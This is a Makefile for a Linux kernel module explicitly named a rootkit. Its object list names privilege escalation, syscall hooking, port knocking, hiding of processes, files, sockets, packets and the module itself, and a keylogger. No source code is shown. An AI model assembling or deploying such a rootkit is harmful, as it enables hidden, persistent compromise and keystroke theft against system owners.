obj-m+=rootkit.o
rootkit-objs += ioctl_channel.o privileged_escalation.o portknocking.o list.o function_hooking.o locking_funcs.o hide_socket.o manipulate_tty.o hide_module.o hide_process.o hide_file.o main.o hide_packets.o find_sct.o keylogger.o

KDIR=/lib/modules/4.9.133/build

all:
	make -C /lib/modules/4.9.133/build SUBDIRS=$(PWD) modules

clean:
	make -C /lib/modules/4.9.133/build SUBDIRS=$(PWD) clean

test:
	gcc -Wall test_hook_read.c -o test
